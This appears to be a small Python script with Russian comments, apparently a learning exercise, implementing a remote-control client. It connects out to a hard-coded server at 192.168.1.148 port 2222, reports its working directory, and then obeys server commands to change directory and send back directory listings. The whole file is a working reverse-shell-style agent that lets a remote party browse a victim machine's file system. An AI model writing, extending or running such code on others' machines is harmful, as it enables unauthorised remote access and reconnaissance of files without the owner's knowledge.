import os
import socket
import subprocess

# Определим констатны
BUFFER_SIZE = 1024
IP_SERVER = '192.168.1.148'
PORT_SERVER = 2222

# Создадим объект класса
client = socket.socket()

# Подключимся к серверу
client.connect((IP_SERVER, PORT_SERVER))

command = ''
# Отправим на сервер директорию
cwd = os.getcwd()
client.send(cwd.encode("utf-8"))

while command != 'dsnt' and command != 'exit':

	# Получим ответ от сервера
	command = client.recv(BUFFER_SIZE).decode("utf-8")
	if command[:3] == 'cd ':
		os.chdir(command[3:])
		cwd = os.getcwd()
		client.send(cwd.encode("utf-8"))
	elif command[:3] == 'dir':
		# Получим содержимое директории
		listdir = os.listdir()
		strdir = " ".join(listdir)

		# Отправим на сервер
		client.send(strdir.encode("utf-8"))

client.close()
